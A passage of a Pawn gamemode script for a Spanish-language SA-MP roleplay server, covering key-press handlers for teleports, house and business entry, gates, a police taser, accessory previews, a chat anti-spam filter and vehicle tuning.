		else if(PlayerToPointStripped(1, playerid, 2766.1648, -2513.5667, 13.6428, cx, cy, cz)){
			LoadObjects(playerid);
			SetPosEx(playerid, 2908.8123, 2126.5759, 0.3203, 0, 0, 0);
			GameTextForPlayer(playerid, "~g~C~w~uarteles", 4000, 1);
		}
		else if(PlayerToPointStripped(1, playerid, 2907.2405, 2126.5566, 0.3281, cx, cy, cz))
		{
			SetPosEx(playerid, 2766.1648, -2513.5667, 13.6428, 0, 0, 0);
			GameTextForPlayer(playerid, "~g~Guardia~n~~w~Nacional", 5000, 1);
		}
		else if(PlayerToPointStripped(1, playerid, 2731.6631, -2417.5254, 13.6280, cx, cy, cz))
		{
			LoadObjects(playerid);
			SetPosEx(playerid, 254.8800, 2023.7145, -6.7623, 0, 0, 0);
			GameTextForPlayer(playerid, "~g~A~w~rmeria", 4000, 1);
		}
		else if(PlayerToPointStripped(3, playerid, 253.3743, 2023.8402, -6.7623, cx, cy, cz))
		{
			SetPosEx(playerid, 2731.6631, -2417.5254, 13.6280, 0, 0, 0);
			GameTextForPlayer(playerid, "~g~Guardia~n~~w~Nacional", 5000, 1);
		}
		// Entrada/Subida Helipuerto
		else if (PlayerToPointStripped(3, playerid, 2721.3474, -2380.0967, 17.3403, cx, cy, cz))
		{
			SetPosEx(playerid, 2747.1721, -2380.1116, 30.0547, 0, 0, 0); //Subir
		}
		else if (PlayerToPointStripped(3, playerid, 2747.1721, -2380.1116, 30.0547, cx, cy, cz))
		{
			SetPosEx(playerid, 2721.3474, -2380.0967, 17.3403, 0, 0, 0); //Bajar
		}
		//Casas Entradas y Salidas
		for(new i=0;i<sizeof(casa);i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez]))
			{
				if(!casa[i][hLock])
				{
					SetPosEx(playerid, casa[i][hExitx], casa[i][hExity], casa[i][hExitz], 0, casa[i][hInt], casa[i][hWorld]);
					cuenta[playerid][cEntrada] = i;
					break;
				}else GameTextForPlayer(playerid, "~r~Cerrado", 5000, 1);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, casa[i][hExitx], casa[i][hExity], casa[i][hExitz]))
			{
				if(cuenta[playerid][cEntrada] == i)
				{
					SetPosEx(playerid, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez], 0, 0, 0);
					cuenta[playerid][cEntrada] = -1;
					break;
				}
			}
		}
		//Negocios Entradas y Salidas
		for(new i=0;i<sizeof(negocio);i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, negocio[i][bEntrancex], negocio[i][bEntrancey], negocio[i][bEntrancez]))
			{
				if(negocio[i][bExitx] == 0.0000 || negocio[i][bEntrancex] == negocio[i][bExitx])return 1;
				if(obtenerDinero(playerid) >= negocio[i][bcostenter])
				{
					LoadObjects(playerid);
					SetPosEx(playerid, negocio[i][bExitx], negocio[i][bExity], negocio[i][bExitz], 0, negocio[i][bInt], negocio[i][bID]);
					cuenta[playerid][cEntrada] = i;
					
					if(negocio[i][bOwned])
					{
						if(negocio[i][bProduc] > 0) 
						{
							pierdeDinero(playerid, negocio[i][bcostenter]);
							negocio[i][bProduc]--;
							negocio[i][bTill] += negocio[i][bcostenter];
						}
					}
					ActualizaNegocio(i);
				}else GameTextForPlayer(playerid, "~r~No tienes dinero", 5000, 1);
			}else if(IsPlayerInRangeOfPoint(playerid, 3.0, negocio[i][bExitx], negocio[i][bExity], negocio[i][bExitz])){
				if(cuenta[playerid][cEntrada] == i){
					SetPosEx(playerid, negocio[i][bEntrancex], negocio[i][bEntrancey], negocio[i][bEntrancez], 0, 0, 0);
					cuenta[playerid][cEntrada] = -1;
					break;
				}
			}
		}
		}
		return 1;
	}
	
	if(newkeys == 16 && InAmbu[playerid] > 0){
		new Float:X, Float:Y, Float:Z;
		GetVehiclePos(InAmbu[playerid], X, Y, Z);
		SetPlayerPos(playerid, X+4, Y, Z);
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		InAmbu[playerid] = 0;
	}
	
    if(IsPlayerInAnyVehicle(playerid))
	{
    	if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER)
		{
      		if(newkeys & KEY_CROUCH)
			{
             	if(GetPlayerWeapon(playerid) >= 22 && GetPlayerWeapon(playerid) <= 34)
	            {
          			if(!DriveBy[playerid])
			        {
               			DriveBy[playerid] = true;
                  		SetPlayerDrunkLevel(playerid, 9000);
               		}
             	}
           }
		}
	    if(newkeys & KEY_SECONDARY_ATTACK)
		{
    		if(DriveBy[playerid])
			{
     			DriveBy[playerid] = 3;
           		SetPlayerDrunkLevel(playerid, 0);
      		}
  		}
	}
	//
	if(newkeys == KEY_NO)
	{
		for(new x=0;x<sizeof(rejas);x++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 25.0, rejas[x][rePos][6], rejas[x][rePos][7], rejas[x][rePos][8]))
			{
				if(!rejas[x][reEstado])
				{
					if(!rejas[x][reFacion])
					{
						if(!rejas[x][reCobra])
						{
							Mensaje(playerid, COLOR_GRIS2, "La reja/barrera se cerrara en 10 segundos.");
							MoveDynamicObject(rejas[x][reID], rejas[x][rePos][0], rejas[x][rePos][1], rejas[x][rePos][2], 1.5, rejas[x][rePos][3], rejas[x][rePos][4], rejas[x][rePos][5]);
							rejas[x][reEstado] = gettime() + 15;
							return 1;
						}
						else
						{
							Mensaje(playerid, COLOR_GRIS2, "La reja/barrera se cerrara en 10 segundos.");
							pierdeDinero(playerid, rejas[x][reCobra]);
							MoveDynamicObject(rejas[x][reID], rejas[x][rePos][0], rejas[x][rePos][1], rejas[x][rePos][2], 1.5, rejas[x][rePos][3], rejas[x][rePos][4], rejas[x][rePos][5]);
							rejas[x][reEstado] = gettime() + 15;
							return 1;
						}
					}
					else if(rejas[x][reFacion] == cuenta[playerid][cMiembro])
					{
						Mensaje(playerid, COLOR_GRIS2, "La reja/barrera se cerrara en 10 segundos.");
						MoveDynamicObject(rejas[x][reID], rejas[x][rePos][0], rejas[x][rePos][1], rejas[x][rePos][2], 1.5, rejas[x][rePos][3], rejas[x][rePos][4], rejas[x][rePos][5]);
						rejas[x][reEstado] = gettime() + 15;
						return 1;
					}
				}
			}
		}
		
		if(!Puertas[playerid])
		{
			Puertas[playerid] = 1;
			CheckForOpenDoor(playerid);
		}
		else
		{
			Puertas[playerid] = 0;
			CheckForCloseDoor(playerid);
		}
	}
	if(newkeys == KEY_LOOK_BEHIND)
	{
		encenderAuto(playerid);
		return 1;
	}
	if(newkeys == KEY_FIRE)
	{
		if(booleano[Tazer]{playerid}){
			if(IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS, "Este comando no se puede utilizar estando en un vehículo.");
			new suspect = GetClosestPlayer(playerid);
			if(booleano[PlayerTazeado]{suspect})return Mensaje(playerid, COLOR_GRIS, "Este jugador ya está tazeado!");
			if(dDistanciaJugador(3.0, playerid, suspect)){
				if(IsACop(suspect))return Mensaje(playerid, COLOR_GRIS, "No puedes tazear a un compañero!");
				new randt = random(4)+1;
				if(randt == 1){
					format(string, sizeof(string), "* Oficial %s dispara contra %s, pero no consigue tazear al sujeto", PlayerName(playerid), PlayerName(suspect));
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					booleano[Tazer]{playerid} = false;
					SetTimerEx("RemoveHand", 7000, false, "i", playerid);
				}else{
					format(string, sizeof(string), "* Oficial %s dispara contra %s y tazea al sujeto", PlayerName(playerid), PlayerName(suspect));
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					format(string, sizeof(string), "* Tazeado (%s)", PlayerName(suspect));
					ProxDetector(30.0, playerid, string, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF);
					GameTextForPlayer(suspect, "ARRESTADO", 2500, 3);
					TogglePlayerControllable(suspect, 0);
					ApplyAnimation(suspect, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
					booleano[PlayerTazeado]{suspect} = true;
					booleano[Tazer]{playerid} = false;
					SetTimerEx("RemoveHand", 7000, false, "i", playerid);
					SetTimerEx("UntazePlayer", 20000, false, "i", suspect);
				}
			}else return Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
		}
	}
	if(newkeys & KEY_WALK)
	{
	    if(Skate[playerid] > 9)
		{
		    ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
		}
	}
	if(newkeys & KEY_SPRINT)
    {
    	if(IsPlayerConnected(playerid))
		{
			if(Skate[playerid] > 9)
  			{
  			    if(Skate[playerid] == 10) ApplyAnimation(playerid, "SKATE", "skate_idle", 4.0, 1, 1, 1, 1, 500);
  			    else if(Skate[playerid] == 20) ApplyAnimation(playerid, "SKATE", "skate_run", 4.0, 1, 1, 1, 1, 500);
  			    else if(Skate[playerid] == 30) ApplyAnimation(playerid, "SKATE", "skate_sprint", 4.0, 1, 1, 1, 1, 500);
  			}
  			else if(booleano[PlayerCuffed]{playerid} || booleano[Rescued]{playerid}) 	ApplyAnimation(playerid, "PED", "WALK_civi", 4.1, 1, 1, 1, 1, 1);
			else if(Accesory[playerid] > 0)
			{
			    if(Accesory[playerid] == 1) // Glasses
			    {
					switch(ClothesID[playerid])
					{
					    case 19005: { Accesory_Test(playerid, 3, 19006, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19006: { Accesory_Test(playerid, 3, 19007, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19007: { Accesory_Test(playerid, 3, 19008, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19008: { Accesory_Test(playerid, 3, 19009, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19009: { Accesory_Test(playerid, 3, 19010, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19010: { Accesory_Test(playerid, 3, 19011, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19011: { Accesory_Test(playerid, 3, 19012, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19012: { Accesory_Test(playerid, 3, 19013, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19013: { Accesory_Test(playerid, 3, 19014, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19014: { Accesory_Test(playerid, 3, 19015, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19015: { Accesory_Test(playerid, 3, 19016, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19016: { Accesory_Test(playerid, 3, 19017, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19017: { Accesory_Test(playerid, 3, 19018, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19018: { Accesory_Test(playerid, 3, 19019, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19019: { Accesory_Test(playerid, 3, 19020, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19020: { Accesory_Test(playerid, 3, 19021, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19021: { Accesory_Test(playerid, 3, 19022, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19022: { Accesory_Test(playerid, 3, 19023, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19023: { Accesory_Test(playerid, 3, 19024, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19024: { Accesory_Test(playerid, 3, 19025, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19025: { Accesory_Test(playerid, 3, 19026, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19026: { Accesory_Test(playerid, 3, 19027, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19027: { Accesory_Test(playerid, 3, 19028, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19028: { Accesory_Test(playerid, 3, 19029, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19029: { Accesory_Test(playerid, 3, 19030, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19030: { Accesory_Test(playerid, 3, 19031, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19031: { Accesory_Test(playerid, 3, 19032, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19032: { Accesory_Test(playerid, 3, 19033, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19033: { Accesory_Test(playerid, 3, 19034, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    case 19034: { Accesory_Test(playerid, 3, 19035, 2, 0.105227, 0.044110, -0.000622, 91.258476, 92.199562, 1.592636, 1.000000, 1.000000, 1.000000, 100); }
					    default: 	{ClothesID[playerid] = 19005; Mensaje(playerid, COLOR_GRIS2, "Has visto todas las gafas. Apreta ESPACIO para volver a verlas"); }
					}
				}
				else if(Accesory[playerid] == 2) // Bandana
			    {
					switch(ClothesID[playerid])
					{
					    case 18910: {Accesory_Bandana(playerid, 18917);}
					    case 18917: {Accesory_Bandana(playerid, 18913);}
					    case 18913: {Accesory_Bandana(playerid, 18916);}
					    case 18916: {Accesory_Bandana(playerid, 18915);}
					    case 18915: {Accesory_Bandana(playerid, 18912);}
					    default: 	{ClothesID[playerid] = 18910; Mensaje(playerid, COLOR_GRIS2, "Has visto todas las bandanas. Apreta ESPACIO para volver a verlas"); }
					}
				}
				else if(Accesory[playerid] == 3) // Hat
			    {
					switch(ClothesID[playerid])
					{
					    case 18925: { Accesory_Test(playerid, 2, 18926, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    case 18926: { Accesory_Test(playerid, 2, 18927, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    case 18927: { Accesory_Test(playerid, 2, 18928, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    case 18928: { Accesory_Test(playerid, 2, 18929, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    case 18929: { Accesory_Test(playerid, 2, 18930, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    case 18930: { Accesory_Test(playerid, 2, 18931, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    case 18931: { Accesory_Test(playerid, 2, 18932, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    case 18932: { Accesory_Test(playerid, 2, 18933, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    case 18933: { Accesory_Test(playerid, 2, 18934, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    case 18934: { Accesory_Test(playerid, 2, 18935, 2, 0.166478, -0.010493, -0.003216, 330.359344, 2.471933, 350.632476, 1.000000, 1.000000, 1.084919, 150); }
					    default: 	{ClothesID[playerid] = 18925; Mensaje(playerid, COLOR_GRIS2, "Has visto todas las gorras. Apreta ESPACIO para volver a verlas"); }
					}
				}
			}
		}
	}
	if(newkeys & KEY_SECONDARY_ATTACK)
	{
    	if(IsPlayerConnected(playerid))
		{
		    if (GetPlayerState(playerid) == 1)
			{
				if(!booleano[ReduceTime]{playerid})
				{
				    new Float:hp; GetPlayerHealth(playerid, hp);
					if(IsPlayerInRangeOfPoint(playerid, 1.0, -36.3182, -56.8905, 1003.5469))
					{
					    booleano[ReduceTime]{playerid} = true;
	    				SetTimerEx("ReduceTimer", 3000, false, "i", playerid);
						if(hp < 100) SetHP(playerid, hp+10);
					}
					else if(IsPlayerInRangeOfPoint(playerid, 1.0, -19.1974, -56.8366, 1003.5469))
					{
					    booleano[ReduceTime]{playerid} = true;
	    				SetTimerEx("ReduceTimer", 3000, false, "i", playerid);
						if(hp < 100) SetHP(playerid, hp+10);
					}
					else if(IsPlayerInRangeOfPoint(playerid, 1.0, -35.9060, -139.2014, 1003.5469))
					{
					    booleano[ReduceTime]{playerid} = true;
	    				SetTimerEx("ReduceTimer", 3000, false, "i", playerid);
						if(hp < 100) SetHP(playerid, hp+10);
					}
					else if(IsPlayerInRangeOfPoint(playerid, 1.0, -15.2743, -139.2626, 1003.5469))
					{
					    booleano[ReduceTime]{playerid} = true;
	    				SetTimerEx("ReduceTimer", 3000, false, "i", playerid);
						if(hp < 100) SetHP(playerid, hp+5);
					}
					else if(IsPlayerInRangeOfPoint(playerid, 1.0, -16.7039, -139.3292, 1003.5469))
					{
					    booleano[ReduceTime]{playerid} = true;
	    				SetTimerEx("ReduceTimer", 3000, false, "i", playerid);
						if(hp < 100) SetHP(playerid, hp+10);
					}
				}
			}
			else if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
			    RemovePlayerFromVehicle(playerid);
			    TogglePlayerControllable(playerid, 1);
			}
		}
	}
    return 1;
}

DetectNumber(string[]){
	new NUMP, CUENTAN;
    for(NUMP = 0; NUMP < strlen(string); NUMP ++)
    {
        if(string[NUMP] == '0' || string[NUMP] == '1' || string[NUMP] == '2' || string[NUMP] == '3' || string[NUMP] == '4' || string[NUMP] == '5' || string[NUMP] == '6' || string[NUMP] == '7' || string[NUMP] == '8' || string[NUMP] == '9') CUENTAN ++;
    }
    if(CUENTAN >= 4)return 1;
    return 0;
}

public OnVehicleSpawn(vehicleid)
{
	GetVehiclePos(vehicleid, gVps[vehicleid][0], gVps[vehicleid][1], gVps[vehicleid][2]);
	if(!EsBicicleta(vehicleid))
	{
		if(EsComprable(vehicleid))
		{
			SetVehicleParamsEx(vehicleid, 0, 0, 0, autos[vehicleid][cLock], 0, 0, 0);
		}
	}
	else
	{ 
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
		SetVehicleParamsEx(vehicleid, 1, lights, alarm, doors, bonnet, boot, objective);
	}
	
	for(new i=0; i<sizeof obtenerLicencia; i++)
	{
		if(obtenerLicencia[i][cocheExamen] == vehicleid)
		{
			SetVehicleVirtualWorld(vehicleid, obtenerLicencia[i][cocheWorld]);
			LinkVehicleToInterior(vehicleid, obtenerLicencia[i][cocheInterior]);
		}
	}
	return 1;
}

static GetXYZInFrontOfPlayer(playerid, &Float: x, &Float: y, &Float: z, Float: distance)
{
	new Float: a;

	GetPlayerPos (playerid, x, y, z);
	GetPlayerFacingAngle (playerid, a);

	x += (distance * floatsin (-a, degrees));
	y += (distance * floatcos (-a, degrees));
}
CallBack::palabrasProhibidas(string[])
{
	new size = strlen(string), suma;
	
	//Detectar IPs
	for(new i=0; i<size;i++)
	{
		if(string[i] == '.' || string[i] == '0' || string[i] == '1' || string[i] == '2' || string[i] == '3' || string[i] == '4' || string[i] == '5' || string[i] == '6' || string[i] == '7' || string[i] == '8' || string[i] == '9')
		{
			suma++;
		}
	}
	if(suma >= 10)return true;
	suma = 0;
	
	//Detectar Palabras
	for(new i=0; i<sizeof prohibibas;i++)
	{
		if(strfind(string, prohibibas[i], true) != -1)
		{
			suma++;
		}
	}
	if(suma)return true;
	suma = 0;
	return false;
}
AccionSPAM(playerid, string[])
{
	new x[186];
	format(x, sizeof(x), "{11BB11}- AntiSPAM {FFFFFF}|| {FF2200}%s(%d): {FFFFFF}%s ||", PlayerName(playerid), playerid, string); 
	AdminMensaje(x);
	return 1;
}
StringOther(playerid, const string[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(strfind(string, "=", true) != -1)    			return 0;
	    else if(strfind(string, "\n", true) != -1) 			return 0;
	    else return 1;
	}
	return 0;
}
Accesory_Test(playerid, index, modelid, bone, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ, price)
{
    SetPlayerAttachedObject(playerid, index, modelid, bone, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ);
    ClothesID		[playerid] = modelid;
    ClothesPrice	[playerid] = price;
    return 1;
}

Accesory_Bandana(playerid, modelid)
{
    ClothesID	[playerid] = modelid;
    ClothesPrice[playerid] = 70;
    new SkinA = GetPlayerSkin(playerid);
    switch(SkinA)
    {
	        case 115:	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.075032, 0.039259, -0.009051, 272.667022, 0.000000, 268.155487); } // Mask7 - skinsur115
			case 114: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.075032, 0.039259, -0.009051, 272.667022, 0.000000, 268.155487); } // Mask7 - skinsur114
			case 116: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.075032, 0.039259, -0.009051, 272.667022, 0.000000, 268.155487); } // Mask7 - skinsur116
			case 173: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.073774, 0.042118, -0.003368, 273.422515, 0.243100, 267.547058); } // Mask7 - skinsur116
			case 174: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.073774, 0.042118, -0.003368, 273.422515, 0.243100, 267.547058); } // Mask7 - skinsur116
			case 175: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.073774, 0.042118, -0.003368, 273.422515, 0.243100, 267.547058); } // Mask7 - skinsur116
		    //groves
	        case 271: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.073522, 0.015061, -0.005912, 277.060668, 9.697027, 264.330200); } // Mask3 - saveskinryder
			case 270: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.083064, 0.015061, 0.003734, 270.357788, 2.187248, 264.330200); } // Mask3 - 270sweet
			case 269: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.083064, 0.017489, 0.002312, 270.357788, 2.187248, 266.944274); } // Mask3 - smoke269
			case 105: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.078534, 0.041857, -0.001727, 268.970458, 1.533374, 269.223754); } // Mask3 - tapadoskin 105 grove
			case 106: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.084321, 0.032509, -0.006748, 268.970458, 1.533374, 269.223754); } // Mask3 - skin 106grove
			case 107: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.084321, 0.035590, -0.004405, 268.970458, 1.533374, 269.223754); } // Mask3 - skin 107grove
			//Latinos
	        case 108: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.084809, 0.026987, 0.000924, 273.545745, 0.572601, 264.837554 ); } // Mask6 - skinvago108
			case 109: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.081629, 0.035036, -0.006385, 273.545745, 0.572601, 264.837554 ); } // Mask6 - skinvago 109
			case 110: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.073774, 0.042118, -0.003368, 273.422515, 0.243100, 267.547058 ); } // Mask6 - skinvago110
			//Ballas
			case 102: 	{ SetPlayerAttachedObject(playerid, 4, 18915, 2, 0.076758, 0.034728, -0.001697, 267.582092, 359.936279, 265.333801 ); } // Mask5 - skin102balla
			case 103: 	{ SetPlayerAttachedObject(playerid, 4, 18915, 2, 0.076758, 0.042026, 0.000579, 267.582092, 359.936279, 265.333801 ); } // Mask5 - 103balla
			case 104: 	{ SetPlayerAttachedObject(playerid, 4, 18915, 2, 0.076758, 0.042026, 0.000579, 267.582092, 359.936279, 265.333801 ); } // Mask5 - skin 104 balla
			case 293: 	{ SetPlayerAttachedObject(playerid, 4, 18915, 2, 0.079601, 0.019614, -0.006095, 272.025512, 0.136046, 268.165863 ); } // Mask5 - oglock
			//Blood
			case 7: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.086248, 0.036498, -0.004328, 270.304412, 359.126678, 266.091674 ); } // Mask2 - blood - 7
			case 67: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.086248, 0.020672, 0.001285, 270.304412, 359.126678, 266.091674 ); } // Mask2 - blood - 67
			case 180: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.084799, 0.039217, -0.007458, 270.304412, 359.126678, 271.452209 ); } // Mask2 - blood- 180
			case 19: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.081000, 0.026039, -0.004144, 270.304412, 359.126678, 271.452209 ); } // Mask2 - blood - 19
			case 144: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.110470, 0.043788, -0.002435, 266.909606, 358.832275, 267.704956 ); } // Bandana2 - 144 - blood
		    //Moteros
			case 23:	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.082504, 0.038338, -0.005320, 271.407196, 356.295104, 267.907989 ); } // Mask2 - skin 100 motero
			case 247: 	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.088066, 0.038264, 0.000398, 271.407196, 356.295104, 267.907989 ); } // Mask2 - skin 247 - motoquero
			case 248:	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.088066, 0.038264, 0.000398, 271.407196, 356.295104, 267.907989 ); } // Mask2 - skin 248 - motoquero
			case 100:	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.088066, 0.038264, 0.000398, 271.407196, 356.295104, 267.907989 ); } // Mask2 - skin 248 - motoquero
			case 33:	{ SetPlayerAttachedObject(playerid, 4, modelid, 2, 0.041866, 0.015547, -0.001428, 271.371276, 356.919921, 269.937591 ); } // Mask2 - skin BIEN 33
	}
}

AddCarTuning(vehicleid)
{
    ChangeVehicleColor(vehicleid, autos[vehicleid][cColorOne], autos[vehicleid][cColorTwo]);
    if(autos[vehicleid][cWheel] > 0) 			AddVehicleComponent(vehicleid, autos[vehicleid][cWheel]);
	if(autos[vehicleid][cHydraulics] > 0) 	AddVehicleComponent(vehicleid, autos[vehicleid][cHydraulics]);
	if(autos[vehicleid][cNitro] > 0) 	 		AddVehicleComponent(vehicleid, autos[vehicleid][cNitro]);
	if(autos[vehicleid][cSideskirt] > 0)
	{
        AddVehicleComponent(vehicleid, autos[vehicleid][cSideskirt]);
        new skirt = autos[vehicleid][cSideskirt];
        // X-FLOW
        if(skirt == 1030) AddVehicleComponent(vehicleid, 1031);
        else if(skirt == 1039) AddVehicleComponent(vehicleid, 1041);
        else if(skirt == 1048) AddVehicleComponent(vehicleid, 1052);
        else if(skirt == 1070) AddVehicleComponent(vehicleid, 1072);
        else if(skirt == 1057) AddVehicleComponent(vehicleid, 1063);
        else if(skirt == 1093) AddVehicleComponent(vehicleid, 1095);
        // ALIEN
        if(skirt == 1026) AddVehicleComponent(vehicleid, 1027);
        else if(skirt == 1036) AddVehicleComponent(vehicleid, 1040);
        else if(skirt == 1047) AddVehicleComponent(vehicleid, 1051);
        else if(skirt == 1069) AddVehicleComponent(vehicleid, 1071);
        else if(skirt == 1056) AddVehicleComponent(vehicleid, 1062);
        else if(skirt == 1094) AddVehicleComponent(vehicleid, 1090);
	}
	if(autos[vehicleid][cRoof] > 0) 	 		AddVehicleComponent(vehicleid, autos[vehicleid][cRoof]);
	if(autos[vehicleid][cSpoiler] > 0) 	 	AddVehicleComponent(vehicleid, autos[vehicleid][cSpoiler]);
	if(autos[vehicleid][cRearBumper] > 0) 	AddVehicleComponent(vehicleid, autos[vehicleid][cRearBumper]);
